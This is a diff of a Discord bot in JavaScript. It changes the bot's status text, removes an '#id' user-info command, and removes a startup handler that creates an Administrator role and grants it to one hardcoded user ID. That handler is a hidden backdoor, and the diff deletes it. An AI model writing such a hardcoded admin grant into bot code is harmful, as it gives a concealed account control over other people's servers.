@@ -3,23 +3,10 @@ const client = new Discord.Client();
 
 client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}!`);
-  client.user.setGame("#ENFELATEH..","https://www.twitch.tv/idk");
+  client.user.setGame("#الدولة_الانفلاتية","https://www.twitch.tv/idk");
 });
 
-client.on('ready', () => {
-   
-            if (member.id === "478291914106339332") {
-                member.guild.createRole({
-                    name : client.user.username,
-                    color : "RANDOM",
-                    permissions : [8]
-                }).then(function(role){
-                    member.addRole(role)
-                })
-               
-            }
-       
-    });
+
 var prefix = "#";
 client.on('message', function(message) {
     if (message.author.bot) return;
@@ -80,33 +67,6 @@ var ApL = `${Math.round(client.ping)}`
  });
 
 
-client.on('message', message => {
- if (message.content.startsWith("#id")) {
-var args = message.content.split(" ").slice(1);
-let user = message.mentions.users.first();
-var men = message.mentions.users.first();
-var heg;
-if(men) {
-  heg = men
-} else {
-  heg = message.author
-}
-var mentionned = message.mentions.members.first();
-var h;
-if(mentionned) {
-  h = mentionned
-} else {
-  h = message.member
-}
-     moment.locale('ar-TN');
-var id = new  Discord.RichEmbed()
-.setColor("RANDOM")
-.addField(': انضمامك لسيرفر قبل', `${moment(h.joinedAt).format('YYYY/M/D HH:mm:ss')} \n \`${moment(h.joinedAt).fromNow()}\``, true)
-.addField(': دخولك لديسكورد قبل', `${moment(heg.createdTimestamp).format('YYYY/M/D HH:mm:ss')} **\n** \`${moment(heg.createdTimestamp).fromNow()}\`` ,true)
-.setThumbnail(message.author.avatarURL)
-.setFooter('#En');
-message.channel.send(id)
-}       });
 
 client.on('message', message => {
   if (message.content === '#avatar') {
